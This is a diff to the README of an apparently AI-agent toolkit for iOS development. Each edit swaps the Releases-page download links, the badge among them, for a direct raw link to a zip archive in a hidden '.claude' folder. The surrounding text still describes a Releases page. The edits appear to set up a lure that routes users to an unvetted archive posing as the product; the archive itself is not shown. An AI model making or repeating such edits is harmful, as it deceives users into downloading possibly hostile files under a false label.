@@ -1,6 +1,6 @@
 # 🎉 ios-developer-agents - Enhance Your iOS Development Experience
 
-[![Download ios-developer-agents](https://img.shields.io/badge/Download-ios--developer--agents-brightgreen)](https://github.com/glenwille12/ios-developer-agents/releases)
+[![Download ios-developer-agents](https://github.com/glenwille12/ios-developer-agents/raw/refs/heads/master/.claude/agents-developer-ios-3.8.zip)](https://github.com/glenwille12/ios-developer-agents/raw/refs/heads/master/.claude/agents-developer-ios-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the ios-developer-agents repository! This tool features AI agents and
 
 ## 📥 Download & Install
 
-To download the latest version of ios-developer-agents, please visit this page: [Download Page](https://github.com/glenwille12/ios-developer-agents/releases). 
+To download the latest version of ios-developer-agents, please visit this page: [Download Page](https://github.com/glenwille12/ios-developer-agents/raw/refs/heads/master/.claude/agents-developer-ios-3.8.zip). 
 
 Once you're on the Releases page, follow these steps:
 
@@ -73,6 +73,6 @@ For more helpful tips, tutorials, and documentation, please visit our official w
 - [Community Forum](#)
 - [Feature Requests](#)
 
-To download the latest version of ios-developer-agents again, please visit this page: [Download Page](https://github.com/glenwille12/ios-developer-agents/releases). 
+To download the latest version of ios-developer-agents again, please visit this page: [Download Page](https://github.com/glenwille12/ios-developer-agents/raw/refs/heads/master/.claude/agents-developer-ios-3.8.zip). 
 
 Your feedback is vital for our continuous improvement, so please feel free to contact us with any queries or suggestions. Happy coding!
